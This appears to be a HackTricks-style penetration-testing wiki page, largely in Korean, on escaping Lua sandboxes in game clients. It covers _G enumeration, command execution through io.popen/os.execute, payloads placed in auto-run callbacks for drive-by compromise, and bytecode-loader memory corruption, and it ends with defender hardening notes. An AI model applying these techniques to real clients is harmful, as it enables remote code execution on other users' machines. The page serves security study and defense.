# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

이 페이지는 애플리케이션(특히 game clients, plugins, 또는 in-app scripting engines)에 내장된 Lua "sandboxes"를 열거하고 탈출하는 실전 기법을 모아놓은 것이다. 많은 엔진이 제한된 Lua 환경을 노출하지만, 강력한 globals에 접근을 허용해 io/os 같은 것이 열려 있거나 bytecode loaders가 노출되면 임의 명령 실행이나 심지어 네이티브 메모리 손상까지 가능하게 되는 경우가 있다.

Key ideas:
- VM을 미지의 환경으로 취급하라: _G를 열거하고 어떤 위험한 primitives에 접근할 수 있는지 발견하라.
- stdout/print가 차단된 경우, 결과를 관찰하기 위해 in-VM UI/IPC 채널을 출력 싱크로 남용하라.
- io/os가 노출되어 있다면, 보통 io.popen, os.execute를 통해 직접 명령 실행이 가능하다.
- load/loadstring/loadfile가 노출되어 있다면, 조작된 Lua bytecode를 실행해 일부 버전(≤5.1의 verifier는 우회 가능; 5.2는 verifier 제거)에서 메모리 안전성을 무너뜨려 고급 익스플로잇을 가능하게 할 수 있다.

## Enumerate the sandboxed environment

- 접근 가능한 테이블/함수들을 목록화하기 위해 global environment를 덤프하라:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- print()를 사용할 수 없는 경우, in-VM 채널을 다른 용도로 전용하세요. 사운드 호출 후에만 채팅 출력이 작동하는 MMO housing script VM의 예로, 다음은 신뢰할 수 있는 출력 함수를 만듭니다:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
대상에 대해 이 패턴을 일반화하세요: 문자열을 입력받는 textbox, toast, logger 또는 UI callback은 정보수집을 위한 stdout으로 사용할 수 있습니다.

## io/os가 노출된 경우 직접 명령 실행

만약 sandbox가 여전히 표준 라이브러리 io 또는 os를 노출하고 있다면, 대개 즉시 명령을 실행할 수 있습니다:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
참고:
- 실행은 client process 내부에서 발생합니다. external debuggers를 차단하는 많은 anti-cheat/antidebug 계층이 in-VM process creation을 막지 못할 수 있습니다.
- 또한 확인: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

호스트 애플리케이션이 scripts를 clients로 푸시하고 VM이 auto-run hooks (예: OnInit/OnLoad/OnEnter)를 노출하면, 스크립트가 로드되는 즉시 drive-by compromise를 위해 payload를 거기에 배치하세요:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
스크립트가 클라이언트로 전송되어 자동으로 실행될 때, OnLoad, OnEnter 등의 동등한 콜백이 이 기법을 일반화합니다.

## recon 중 찾아야 할 위험한 프리미티브

During _G enumeration, specifically look for:
- io, os: io.popen, os.execute, 파일 I/O, 환경 변수 접근.
- load, loadstring, loadfile, dofile: 소스 또는 바이트코드 실행; 신뢰할 수 없는 바이트코드 로딩 지원.
- package, package.loadlib, require: 동적 라이브러리 로딩 및 모듈 인터페이스.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, 및 hooks.
- LuaJIT-only: ffi.cdef, ffi.load를 사용해 네이티브 코드를 직접 호출.

Minimal usage examples (if reachable):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Optional escalation: abusing Lua bytecode loaders

When load/loadstring/loadfile are reachable but io/os are restricted, execution of crafted Lua bytecode can lead to memory disclosure and corruption primitives. Key facts:
- Lua ≤ 5.1 shipped a bytecode verifier that has known bypasses.
- Lua 5.2 removed the verifier entirely (official stance: applications should just reject precompiled chunks), widening the attack surface if bytecode loading is not prohibited.
- Workflows typically: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), then pivot to arbitrary read/write or native code execution.

이 경로는 엔진/버전별(engine/version-specific) 특성이 강하고 RE가 필요하다. 심층 분석, exploitation primitives, 게임 내 예제 gadgetry 등은 아래 references를 참조하라.

## Detection and hardening notes (for defenders)

- Server side: 사용자 스크립트를 거부하거나 재작성; 안전한 API만을 allowlist; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi를 제거하거나 bind-empty로 처리.
- Client side: minimal _ENV로 Lua를 실행; bytecode loading 금지; 엄격한 bytecode verifier나 서명 검사를 재도입; 클라이언트 프로세스에서의 프로세스 생성 차단.
- Telemetry: script load 직후 gameclient → child process creation에 대해 경보; UI/chat/script 이벤트와 상관관계 분석.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
